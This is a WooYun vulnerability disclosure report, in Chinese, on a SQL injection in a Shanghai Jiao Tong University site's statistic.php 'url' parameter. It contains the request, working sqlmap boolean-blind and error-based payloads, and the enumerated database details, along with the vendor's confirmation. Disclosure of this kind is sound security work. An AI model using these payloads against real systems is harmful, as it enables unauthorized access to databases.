wybug_title: 上海交通大学某站SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-12-06：	细节已通知厂商并且等待厂商处理中									2015-12-06：	厂商已经确认，细节仅向厂商公开									2015-12-16：	细节向核心白帽子及相关领域专家公开									2015-12-26：	细节向普通白帽子公开									2016-01-05：	细节向实习白帽子公开									2016-01-20：	细节向公众公开  简要描述： rt 详细说明：  
GET /statistic.php?url=  HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://numericaltank.sjtu.edu.cnCookie: pro.liao=visitedHost: numericaltank.sjtu.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*
url处存在注入
sqlmap resumed the following injection point(s) from stored session:---Parameter: url (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause (Generic comment)    Payload: url= ' AND 7588=7588--     Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: url=-8786' OR 1 GROUP BY CONCAT(0x71716b7a71,(SELECT (CASE WHEN (5510=5510) THEN 1 ELSE 0 END)),0x717a707171,FLOOR(RAND(0)*2)) HAVING MIN(0)#---web application technology: PHP 5.6.3, Apache 2.4.10back-end DBMS: MySQL 5current user:    'statistic@localhost'current database:    'pro_liao'current user is DBA:    Falseavailable databases [3]:[*] information_schema[*] pro_liao[*] test
   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-06 10:47 厂商回复： 谢谢，我们立即处理！ 最新状态： 暂无
